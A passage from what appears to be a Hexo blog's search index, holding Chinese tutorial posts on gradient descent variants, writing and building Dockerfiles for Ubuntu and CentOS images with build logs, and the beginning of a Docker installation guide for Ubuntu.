      <url>/2022/09/27/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h1><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927211653.png" alt="image-20220927211653320"></p><h2 id="批量梯度下降"><a href="#批量梯度下降" class="headerlink" title="批量梯度下降"></a>批量梯度下降</h2><p>　　在经典的随机梯度下降算法（批量梯度下降）中，迭代下降公式是</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929075945.png" alt="image-20220929075937929"></p><p>　　以</p><p>一元线性回归的目标函数为例</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080202.png" alt="image-20220929080202871"></p><p>　　其梯度表达为</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080217.png" alt="image-20220929080217757"></p><p>　　可以看到，==这里的梯度计算，使用了所有的样本数据。倘若数据集有 1000 组数据，那就需要计算 1000 次才可以得到梯度，倘若数据集有一亿组数据，就需要计算一亿次，其时间复杂度是 O(n)== 。当样本数据较多时，对于模型的求解，学习一次的过程是很浪费时间的。　</p><hr><p>　　举例：使用只含有==一个特征的线性回归==来展开。<br>　　线性回归的假设函数为：</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080227.png" alt="image-20220929080227333"></p><p>　　其中 i=1,2,…,n，其中 n 表示样本数。<br>　　对应的目标函数（代价函数）即为：</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080242.png" alt="image-20220929080242727"></p><p>　　==批量梯度下降法是指在每一次迭代时使用所有样本来进行梯度的更新==。</p><p>　　步骤如下：<br>　　(1)对目标函数求偏导</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080253.png" alt="image-20220929080253628"></p><p>　　其中 i=1,2,…,n。n 表示样本数，j=0,1 表示特征数，这里使用了偏置项 x(i)0=1<br>　　(2)每次迭代对参数进行更新：　</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080304.png" alt="image-20220929080303958"></p><p>　　注意：这里更新时存在一个求和函数，即为对所有样本进行计算处理，可与下文SGD法进行比较。<br>　　==优点：==<br>  (1)一次迭代是对所有样本进行计算，此时利用矩阵进行操作，实现了并行。<br>  (2)由全数据集确定的方向能够更好地代表样本总体，从而更准确地朝向极值所在的方向。当目标函数为凸函数时，BGD一定能够得到全局最优。<br>  ==缺点==：<br>  (1)当样本数目 nn 很大时，每迭代一步都需要对所有样本计算，训练过程会很慢。<br>  从迭代的次数上来看，BGD迭代的次数相对较少。</p><h2 id="随机梯度下降"><a href="#随机梯度下降" class="headerlink" title="随机梯度下降"></a>随机梯度下降</h2><p>　　为解决批量梯度下降法学习一次浪费时间的问题，因此，可以==在所有的样本数据中选择随机的一个实例==，用这个实例所包含的数据计算“梯度”。此时的梯度为</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080328.png" alt="image-20220929080328846"></p><p>　　其中 (xi,yi) 是一个随机选中的样本。<br>　　到了这里，可能会存在一定的疑问，因为目标函数（代价函数）</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080337.png" alt="image-20220929080336986"></p><p>　　其梯度并不是</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080343.png" alt="image-20220929080343126"></p><p>　　==那么这个方向还是不是可以使目标函数值下降的方向？只能说，对于一次迭代而言，不一定，但是站在宏观的角度去考虑，最后还是很有机会收敛到近似最优解的。==<br>　　事实上，目标函数可以写成</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080348.png" alt="image-20220929080348748"></p><p>　　所以梯度则是</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080354.png" alt="image-20220929080354688"></p><p>　　==这时，优化目标是所有样本的损失函数之和，所以在梯度下降时，自然而然是朝着使总的偏差缩小的方向去移动的。而对于随机梯度下降，每一步迭代的优化目标函数不是始终不变的，其变化的范围就是==</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080402.png" alt="image-20220929080402205"></p><p>　　在第 i步，随机地选中 S(i)作为优化目标，其梯度便是</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080408.png" alt="image-20220929080408409"></p><p>　　而在第 i+1步，我们的优化目标可能就变成了</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080422.png" alt="image-20220929080422214"></p><p>　　此时，梯度也自然变成了</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080428.png" alt="image-20220929080428619"></p><p>　　====显然，随机梯度下降迭代过程中，考虑的下降方向并不是全局下降方向，而是使得某个随机选中的样本的损失函数下降的方向。在一步迭代中，这种局部样本的下降未必会导致全局损失的下降，但是当迭代次数足够的时候，绝大部分样本都会被考虑到，最终一步一步走向全局最优解。==<br>　　==所以，随机梯度下降相对于梯度下降而言，其根本区别在于每一步迭代时需要优化的目标函数不同。对于经典的梯度下降，其每一步的目标函数（损失函数）是一样的，即所有样本的（平均）损失函数之和。而对于随机梯度下降而言，其每一步的目标函数是被随机选中的某个样本的损失函数，并不是一直不变的。====<br>　　可以通过下面这个视频直观地感受一下随机梯度下降。</p><p>　　<a href="https://www.zhihu.com/zvideo/1308443683624992768">SGD可视化视频</a></p><p>　　上面的每个小球，可以将其理解为随机梯度下降过程中由于随机性而带来的迭代情况的分支。正是由于这种随机性的存在，每个球可以较为自由地选择运动方向，有些就停在某个位置，有些则一路向下。当迭代的次数足够多时，总会有某个球的路径十分顺畅，最终到达全局最优解的附近。随机梯度下降相对于经典梯度下降，其逃离局部最优的能力更强。因为一旦到达了某个样本的局部最优，随着目标函数的更换，很可能不再是另一个样本的局部最优，迭代就可以继续进行。<br>　　当然，==随机梯度下降的缺点也是存在的，即它很可能无法收敛到全局最优解。什么是全局最优，==是 </p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080441.png" alt="image-20220929080441567"></p><p> 达到最小嘛？还是每一个 S(i) 都无法继续下降？一般而言，前者可能更容易衡量一些，我们也更偏向于使用总体的最优作为全局最优，而非每一个样本的最优。而对于随机梯度下降，即使已经达到了总体全局最优，对于某些样本而言，其可能依然可以继续下降，所以一旦选中了这些样本，就要偏离全局最优点。所以随机梯度下降最终的收敛性确实值得考虑。<br>　　但总的来说，==随机梯度下降还是很不错的，特别是对于大样本的处理情况，每一次迭代中 O(1) 的计算开销无疑会轻松很多，至于最终的收敛问题，则要根据迭代次数，终止准则等进行一个衡量取舍啦。==</p><hr><p>　　<strong>随机梯度下降法</strong>不同于批量梯度下降，随机梯度下降是<strong>每次迭代</strong>使用<strong>一个样本</strong>来对参数进行更新。使得训练速度加快。</p><p>  对于<strong>一个样本</strong>的目标函数为：</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080448.png" alt="image-20220929080448441"></p><p>　　(1)对目标函数求偏导：</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080455.png" alt="image-20220929080455602"></p><p>　　(2)参数更新：</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080503.png" alt="image-20220929080503544"></p><p>　　注意：这里不再有求和符号</p><h2 id="小批量梯度下降"><a href="#小批量梯度下降" class="headerlink" title="小批量梯度下降"></a><strong>小批量梯度下降</strong></h2><p>　　在了解了经典的梯度下降和随机梯度下降，并且知道其不同之处主要在于迭代过程中目标函数选择的不同。经典梯度下降虽然稳定性比较强，但是大样本情况下迭代速度较慢；随机梯度下降虽然每一步迭代计算较快，但是其稳定性不太好，而且实际使用中，参数的调整往往更加麻烦。<br>　　所以，为了协调稳定性和速度，小批量梯度下降应运而生。小批量梯度下降法和前面两种梯度下降的主要区别就是每一步迭代过程中目标函数的选择不同。小批量梯度下降是从 n个样本中随机且不重复地选择 m 个进行损失函数的求和</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080511.png" alt="image-20220929080511002">　　　</p><p>　　并将其作为每一步迭代过程中的目标函数。此时，迭代公式中的梯度也就变成了</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929080519.png" alt="image-20220929080519046">　　　　</p><p>　　显然，m=1 时，小批量梯度下降就是随机梯度下降，m=n 时，小批量梯度下降就是经典梯度下降。同时，我们也把经典的梯度下降方法称之为全批量梯度下降。这里的 m 一般称之为批量尺寸，其值的选择对于收敛的稳定性和速度有着较大的影响，也是一个技术活。<br>　　其他的也没什么好分析的了，基本上和随机梯度下降差不多。</p><hr><p>　　<strong>小批量梯度下降</strong>，是对批量梯度下降以及随机梯度下降的一个折中办法。其思想是：<strong>每次迭代</strong> 使用 batch_size 个样本来对参数进行更新。</p><p>  这里我们假设batchsize=10，样本数m=1000</p><p> 　<strong>优点：</strong><br>  （1）通过矩阵运算，每次在一个 batch 上优化神经网络参数并不会比单个数据慢太多。<br>  （2）每次使用一个 batch 可以大大减小收敛所需要的迭代次数，同时可以使收敛到的结果更加接近梯度下降的效果。(比如上例中的30W，设置 batch_size=100 时，需要迭代 3000 次，远小于 SGD 的 30W 次)<br>  （3）可实现并行化。<br>  <strong>缺点：</strong><br>  （1）batch_size的不当选择可能会带来一些问题。<br>  <strong>batcha_size的选择带来的影响：</strong><br>  （1）在合理地范围内，增大batch_size的好处：<br>    a. 内存利用率提高了，大矩阵乘法的并行化效率提高。<br>    b. 跑完一次 epoch（全数据集）所需的迭代次数减少，对于相同数据量的处理速度进一步加快。<br>    c. 在一定范围内，一般来说 Batch_Size 越大，其确定的下降方向越准，引起训练震荡越小。<br>  （2）盲目增大batch_size的坏处：<br>    a. 内存利用率提高了，但是内存容量可能撑不住了。<br>    b. 跑完一次 epoch（全数据集）所需的迭代次数减少，要想达到相同的精度，其所花费的时间大大增加了，从而对参数的修正也就显得更加缓慢。<br>    c. Batch_Size 增大到一定程度，其确定的下降方向已经基本不再变化。</p><p>博客链接：</p><p><a href="https://www.cnblogs.com/BlairGrowing/p/15059613.html">机器学习——批量梯度下降法、随机梯度下降法、小批量梯度下降法 - 关注我更新论文解读 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile</title>
      <link href="/2022/09/04/Dockerfile/"/>
      <url>/2022/09/04/Dockerfile/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220521092902.png" alt="image-20220521092855112"></p><p>Dockerfile 是用来构建 Docker 镜像的文件，可以理解为<strong>命令参数脚本</strong>。</p><p>Dockerfile 是面向开发的，想要打包项目，就要编写 Dockerfile 文件。</p><h1 id="官方Dockerfile"><a href="#官方Dockerfile" class="headerlink" title="官方Dockerfile"></a>官方Dockerfile</h1><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220521093055.png" alt="image-20220521093055721"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220521093029.png" alt="image-20220521093029332"></p><p>不过，官方镜像都是基础包，很多功能是没有的，比如 centos 的官方镜像是没有 <code>vim</code> 命令的。</p><p>像这种基础命令比较常用，如果想要使用可以在容器内安装，但这样很不方便，因为每个新启动的容器都要安装。</p><p>我们通常会选择自己搭建镜像，这就要用到 Dockerfile 了。</p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><blockquote><p>Dockerfile 规则</p></blockquote><ul><li>每个指令都必须是大写字母。</li><li>按照从上到下顺序执行。</li><li><strong>#</strong> 表示注释。</li><li>每一条指令都会创建一个新的镜像层。</li></ul><blockquote><p>规则解释</p></blockquote><ul><li><code>FROM</code>：基础镜像，比如 centos。</li><li><code>MAINTAINER</code>：镜像是谁写的。建议以此格式：<code>姓名&lt;邮箱&gt;</code>。</li><li><code>RUN</code>：镜像构建时需要运行的命令。</li><li><code>ADD</code>：添加，比如添加一个 tomcat 压缩包。</li><li><code>WORKDIR</code>：镜像的工作目录。</li><li><code>VOLUME</code>：挂载的目录。</li><li><code>EXPOSE</code>：指定暴露端口，跟 -p 一个道理。</li><li><code>RUN</code>：最终要运行的。</li><li><code>CMD</code>：指定这个容器启动的时候要运行的命令，只有最后一个会生效，而且可被替代。</li><li><code>ENTRYPOINT</code>：指定这个容器启动的时候要运行的命令，可以追加命令。</li><li><code>ONBUILD</code>：当构建一个被继承Dockerfile 这个时候运行ONBUILD指定，触发指令。</li><li><code>COPY</code>：将文件拷贝到镜像中。</li><li><code>ENV</code>：构建的时候设置环境变量。</li></ul><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220521093454.png" alt="image-20220521093454303"></p><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p>Dockerfile 编写好后，需要使用 <code>docker build</code> 命令运行。</p><blockquote><p>语法</p></blockquote><pre><code>docker build [参数] 路径 | 网络地址 | -</code></pre><blockquote><p>参数</p></blockquote><ul><li><code>-f</code>：指定要使用的Dockerfile路径。</li><li><code>-t</code>：镜像的名字及标签，通常 <strong>name:tag</strong> 或者 <strong>name</strong> 格式；可以在一次构建中为一个镜像设置多个标签。</li><li><code>-m</code>：设置内存最大值。</li></ul><h2 id="创建自己ubuntu"><a href="#创建自己ubuntu" class="headerlink" title="创建自己ubuntu"></a>创建自己ubuntu</h2><p><strong><code>环境：ubuntu16.04</code></strong></p><blockquote><p>1.配置自己dockerfile文件</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/dockerfile# cat mydockerfile-ubuntu FROM ubuntu #爬取镜像MAINTAINER Capital<1134538564@qq.com>#作者信息ENV MYPATH /usr/local #环境配置WORKDIR $MYPATH #工作木露露RUN sed -i 's#http://archive.ubuntu.com/#http://mirrors.tuna.tsinghua.edu.cn/#' /etc/apt/sources.list;RUN apt-get  update && apt-get  install -y vimEXPOSE 80 #端口开启CMD echo $MYPATHCMD echo "--------------------------------------------------"CMD /bin/bash </code></pre><blockquote><p>2.构建自己dockerfile文件</p></blockquote><pre class=" language-shell"><code class="language-shell">-f 构建文件-t 构建镜像名root@ubuntu:/home/dockerfile# docker build -f mydockerfile-ubuntu -t myubuntu:01 .Sending build context to Docker daemon  3.072kBStep 1/10 : FROM ubuntu ---> d2e4e1f51132Step 2/10 : MAINTAINER Capital<1134538564@qq.com> ---> Running in e187f1477eaaRemoving intermediate container e187f1477eaa ---> 4cabe1ecf65dStep 3/10 : ENV MYPATH /usr/local ---> Running in 08b468824edaRemoving intermediate container 08b468824eda ---> 7f40a505c55eStep 4/10 : WORKDIR $MYPATH ---> Running in af20729eced3Removing intermediate container af20729eced3 ---> bce57e71d2c0Step 5/10 : RUN sed -i 's#http://archive.ubuntu.com/#http://mirrors.tuna.tsinghua.edu.cn/#' /etc/apt/sources.list; ---> Running in 106dad01c702Removing intermediate container 106dad01c702 ---> 5c93e482bdcdStep 6/10 : RUN apt-get  update && apt-get  install -y vim ---> Running in 38f4997bdc7aGet:1 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]Get:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy InRelease [270 kB]Get:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-updates InRelease [109 kB]Get:4 http://security.ubuntu.com/ubuntu jammy-security/multiverse amd64 Packages [4653 B]Get:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-backports InRelease [99.8 kB]Get:6 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [100.0 kB]Get:7 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy/main amd64 Packages [1792 kB]Get:8 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [132 kB]Get:9 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [64.8 kB]Get:10 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy/multiverse amd64 Packages [266 kB]Get:11 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy/restricted amd64 Packages [164 kB]Get:12 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy/universe amd64 Packages [17.5 MB]Get:13 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-updates/main amd64 Packages [194 kB]Get:14 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-updates/multiverse amd64 Packages [4653 B]Get:15 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-updates/restricted amd64 Packages [132 kB]Get:16 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-updates/universe amd64 Packages [107 kB]Get:17 http://mirrors.tuna.tsinghua.edu.cn/ubuntu jammy-backports/universe amd64 Packages [1202 B]Fetched 21.0 MB in 16s (1302 kB/s)Reading package lists...Reading package lists...Building dependency tree...Reading state information...The following additional packages will be installed:  libexpat1 libgpm2 libmpdec3 libpython3.10 libpython3.10-minimal  libpython3.10-stdlib libreadline8 libsodium23 libsqlite3-0 media-types  readline-common vim-common vim-runtime xxdSuggested packages:  gpm readline-doc ctags vim-doc vim-scriptsThe following NEW packages will be installed:  libexpat1 libgpm2 libmpdec3 libpython3.10 libpython3.10-minimal  libpython3.10-stdlib libreadline8 libsodium23 libsqlite3-0 media-types  readline-common vim vim-common vim-runtime xxd0 upgraded, 15 newly installed, 0 to remove and 4 not upgraded.Need to get 14.5 MB of archives.Removing intermediate container 38f4997bdc7a ---> 363fc101c02cStep 7/10 : EXPOSE 80 ---> Running in ce499a34a0dbRemoving intermediate container ce499a34a0db ---> c09360735fd0Step 8/10 : CMD echo $MYPATH ---> Running in 02fe7cc892fcRemoving intermediate container 02fe7cc892fc ---> 859adf3140e6Step 9/10 : CMD echo "--------------------------------------------------" ---> Running in 33e8b2ff1696Removing intermediate container 33e8b2ff1696 ---> f73c12571557Step 10/10 : CMD /bin/bash ---> Running in ff6f8d50e420Removing intermediate container ff6f8d50e420 ---> aca62b353cc7Successfully built aca62b353cc7Successfully tagged myubuntu:01</code></pre><p><code>注意由于是在ubuntu虚拟机构建ubuntu 镜像 ，因此命令是apt-get ,apt源文件在 /etc/aptsources.list</code></p><blockquote><p>3.查看docker 镜像</p></blockquote><pre class=" language-sheLl"><code class="language-sheLl">构建前root@ubuntu:/usr/local# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED        SIZEtomcat          latest    5eb506608219   3 days ago     685MBnginx           latest    de2543b9436b   3 days ago     142MBmysql           5.7       a3d35804fa37   9 days ago     462MBubuntu          latest    d2e4e1f51132   3 weeks ago    77.8MBcentos          latest    5d0da3dc9764   8 months ago   231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago    315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago    622MB构建后root@ubuntu:/usr/local# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED         SIZEmyubuntu        01        aca62b353cc7   5 minutes ago   171MBtomcat          latest    5eb506608219   3 days ago      685MBnginx           latest    de2543b9436b   3 days ago      142MBmysql           5.7       a3d35804fa37   9 days ago      462MBubuntu          latest    d2e4e1f51132   3 weeks ago     77.8MBcentos          latest    5d0da3dc9764   8 months ago    231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago     315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago     622MB</code></pre><h2 id="创建自己centos"><a href="#创建自己centos" class="headerlink" title="创建自己centos"></a>创建自己centos</h2><p><strong><code>环境：ubuntu16.04</code></strong></p><blockquote><p>1.配置自己dockerfile文件</p></blockquote><pre class=" language-sheLl"><code class="language-sheLl">FROM centosMAINTAINER Capital<1134538564@qq.com>ENV MYPATH /usr/localWORKDIR $MYPATHRUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-* #相当于在centos 镜像中执行shell脚本，故使用yum命令RUN  sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*RUN yum makecache && yum update -y && yum install -y vim EXPOSE 80 CMD echo $MYPATHCMD echo "--------------------------------------------------"CMD /bin/bash</code></pre><p><code>注意由于是在ubuntu虚拟机构建centos镜像 ，因此命令是yum ,yum源文件在 /etc/yum.repos.d</code></p><blockquote><p>2.构建自己dockerfile文件</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/dockerfile# docker build -f mydockerfile-centos -t mycentos:01 .Sending build context to Docker daemon  3.072kBStep 1/11 : FROM centos ---> 5d0da3dc9764Step 2/11 : MAINTAINER Capital<1134538564@qq.com> ---> Running in 5dbc02cd3b03Removing intermediate container 5dbc02cd3b03 ---> a8e8e868105cStep 3/11 : ENV MYPATH /usr/local ---> Running in baccf89a1e3cRemoving intermediate container baccf89a1e3c ---> 892025521a4cStep 4/11 : WORKDIR $MYPATH ---> Running in 1d60b31c7335Removing intermediate container 1d60b31c7335 ---> 2eeff73df859Step 5/11 : RUN sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-* ---> Running in 0922400621eaRemoving intermediate container 0922400621ea ---> a9ecb3ff1fc6Step 6/11 : RUN  sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-* ---> Running in 71c38cb7b54dRemoving intermediate container 71c38cb7b54d ---> b7ea60e926fcStep 7/11 : RUN yum makecache && yum update -y && yum install -y vim ---> Running in 76f5873aa5e0CentOS Linux 8 - AppStream                      1.3 MB/s | 8.4 MB     00:06    CentOS Linux 8 - BaseOS                         304 kB/s | 4.6 MB     00:15    CentOS Linux 8 - Extras                         3.3 kB/s |  10 kB     00:03    Metadata cache created.Last metadata expiration check: 0:00:01 ago on Sat May 21 03:33:15 2022.Dependencies resolved.================================================================================ Package                     Arch   Version                     Repo       Size================================================================================Upgrading: bash                        x86_64 4.4.20-2.el8                baseos    1.5 M bind-export-libs            x86_64 32:9.11.26-6.el8            baseos    1.1 M binutils                    x86_64 2.30-108.el8_5.1            baseos    5.8 M ca-certificates             noarch 2021.2.50-80.0.el8_4        baseos    390 k centos-gpg-keys             noarch 1:8-3.el8                   baseos     12 k centos-linux-release        noarch 8.5-1.2111.el8              baseos     22 k centos-linux-repos          noarch 8-3.el8                     baseos     20 k chkconfig                   x86_64 1.19.1-1.el8                baseos    198 k coreutils-single            x86_64 8.30-12.el8                 baseos    629 k crypto-policies             noarch 20210617-1.gitc776d3e.el8   baseos     63 k curl                        x86_64 7.61.1-22.el8               baseos    351 k dbus                        x86_64 1:1.12.8-14.el8             baseos     41 k dbus-common                 noarch 1:1.12.8-14.el8             baseos     46 k dbus-daemon                 x86_64 1:1.12.8-14.el8             baseos    240 k dbus-libs                   x86_64 1:1.12.8-14.el8             baseos    184 k dbus-tools                  x86_64 1:1.12.8-14.el8             baseos     85 k device-mapper               x86_64 8:1.02.177-10.el8           baseos    377 k device-mapper-libs          x86_64 8:1.02.177-10.el8           baseos    409 k dhcp-client                 x86_64 12:4.3.6-45.el8             baseos    318 k dhcp-common                 noarch 12:4.3.6-45.el8             baseos    207 k dhcp-libs                   x86_64 12:4.3.6-45.el8             baseos    148 k dnf                         noarch 4.7.0-4.el8                 baseos    544 k dnf-data                    noarch 4.7.0-4.el8                 baseos    154 k dracut                      x86_64 049-191.git20210920.el8     baseos    374 k dracut-network              x86_64 049-191.git20210920.el8     baseos    108 k dracut-squash               x86_64 049-191.git20210920.el8     baseos     61 k elfutils-default-yama-scope noarch 0.185-1.el8                 baseos     49 k elfutils-libelf             x86_64 0.185-1.el8                 baseos    221 k elfutils-libs               x86_64 0.185-1.el8                 baseos    292 k ethtool                     x86_64 2:5.8-7.el8                 baseos    209 k file-libs                   x86_64 5.33-20.el8                 baseos    543 k filesystem                  x86_64 3.8-6.el8                   baseos    1.1 M glib2                       x86_64 2.56.4-156.el8              baseos    2.5 M glibc                       x86_64 2.28-164.el8                baseos    3.6 M glibc-common                x86_64 2.28-164.el8                baseos    1.3 M glibc-minimal-langpack      x86_64 2.28-164.el8                baseos     58 k gnutls                      x86_64 3.6.16-4.el8                baseos    1.0 M gpgme                       x86_64 1.13.1-9.el8                baseos    336 k hwdata                      noarch 0.314-8.10.el8              baseos    1.7 M iproute                     x86_64 5.12.0-4.el8                baseos    775 k iptables-libs               x86_64 1.8.4-20.el8                baseos    107 k json-c                      x86_64 0.13.1-2.el8                baseos     40 k kexec-tools                 x86_64 2.0.20-57.el8_5.1           baseos    514 k keyutils-libs               x86_64 1.5.10-9.el8                baseos     34 k kmod                        x86_64 25-18.el8                   baseos    126 k kmod-libs                   x86_64 25-18.el8                   baseos     68 k krb5-libs                   x86_64 1.18.2-14.el8               baseos    840 k libblkid                    x86_64 2.32.1-28.el8               baseos    217 k libcap                      x86_64 2.26-5.el8                  baseos     60 k libcap-ng                   x86_64 0.7.11-1.el8                baseos     33 k libcom_err                  x86_64 1.45.6-2.el8                baseos     49 k libcomps                    x86_64 0.1.16-2.el8                baseos     82 k libcurl-minimal             x86_64 7.61.1-22.el8               baseos    287 k libdb                       x86_64 5.3.28-42.el8_4             baseos    751 k libdb-utils                 x86_64 5.3.28-42.el8_4             baseos    1 </code></pre><blockquote><p>3.查看docker 镜像</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/usr/local# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED         SIZEmyubuntu        01        aca62b353cc7   5 minutes ago   171MBtomcat          latest    5eb506608219   3 days ago      685MBnginx           latest    de2543b9436b   3 days ago      142MBmysql           5.7       a3d35804fa37   9 days ago      462MBubuntu          latest    d2e4e1f51132   3 weeks ago     77.8MBcentos          latest    5d0da3dc9764   8 months ago    231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago     315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago     622MBroot@ubuntu:/usr/local# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED          SIZEmycentos        01        90a67d66c221   3 minutes ago    559MBmyubuntu        01        aca62b353cc7   20 minutes ago   171MBtomcat          latest    5eb506608219   3 days ago       685MBnginx           latest    de2543b9436b   3 days ago       142MBmysql           5.7       a3d35804fa37   9 days ago       462MBubuntu          latest    d2e4e1f51132   3 weeks ago      77.8MBcentos          latest    5d0da3dc9764   8 months ago     231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago      315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago      622MB</code></pre><blockquote><p>4.查看构建过程 docker history  镜像</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/usr/local# docker history mycentos:01IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT90a67d66c221   9 minutes ago    /bin/sh -c #(nop)  CMD ["/bin/sh" "-c" "/bin…   0B        e8fbb51a3427   9 minutes ago    /bin/sh -c #(nop)  CMD ["/bin/sh" "-c" "echo…   0B        fe241751749f   9 minutes ago    /bin/sh -c #(nop)  CMD ["/bin/sh" "-c" "echo…   0B        343201c932ea   9 minutes ago    /bin/sh -c #(nop)  EXPOSE 80                    0B        b03502f16230   9 minutes ago    /bin/sh -c yum makecache && yum update -y &&…   328MB     b7ea60e926fc   11 minutes ago   /bin/sh -c sed -i 's|#baseurl=http://mirror.…   8.8kB     a9ecb3ff1fc6   11 minutes ago   /bin/sh -c sed -i 's/mirrorlist/#mirrorlist/…   8.82kB    2eeff73df859   11 minutes ago   /bin/sh -c #(nop) WORKDIR /usr/local            0B        892025521a4c   11 minutes ago   /bin/sh -c #(nop)  ENV MYPATH=/usr/local        0B        a8e8e868105c   11 minutes ago   /bin/sh -c #(nop)  MAINTAINER Capital<113453…   0B        5d0da3dc9764   8 months ago     /bin/sh -c #(nop)  CMD ["/bin/bash"]            0B        <missing>      8 months ago     /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B        <missing>      8 months ago     /bin/sh -c #(nop) ADD file:805cb5e15fb6e0bb0…   231MB   </code></pre><h2 id="创建dockerfile遇到问题"><a href="#创建dockerfile遇到问题" class="headerlink" title="创建dockerfile遇到问题"></a>创建dockerfile遇到问题</h2><p>参考链接：<code>The command ‘/bin/sh -c apt-get install -y vim’ returned a non-zzero code: 100</code><a href="https://blog.csdn.net/stay_foolish12/article/details/123712148">https://blog.csdn.net/stay_foolish12/article/details/123712148</a></p><h2 id="CMD-和ENTRYPOINT区别"><a href="#CMD-和ENTRYPOINT区别" class="headerlink" title="CMD 和ENTRYPOINT区别"></a>CMD 和ENTRYPOINT区别</h2><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220521115340.png" alt="image-20220521115339960"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装</title>
      <link href="/2022/09/01/Docker/"/>
      <url>/2022/09/01/Docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h2><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/202205172210543.jpg" alt="a"></p><h2 id="unbantu-安装docker"><a href="#unbantu-安装docker" class="headerlink" title="unbantu 安装docker"></a>unbantu 安装docker</h2><p><strong>1，4，5</strong></p><h3 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h3><pre class=" language-xml"><code class="language-xml"># 1. 卸载dockersudo apt-get remove docker docker-engine docker.io containerd runc# 2. 更新包索引sudo apt-get update# 3. 安装依赖sudo apt-get -y install \    apt-transport-https \    ca-certificates \    curl \    gnupg-agent \    software-properties-common# 4. 添加 docker 官方 GPG 密钥curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# 5. 添加安装 docker 软件源# 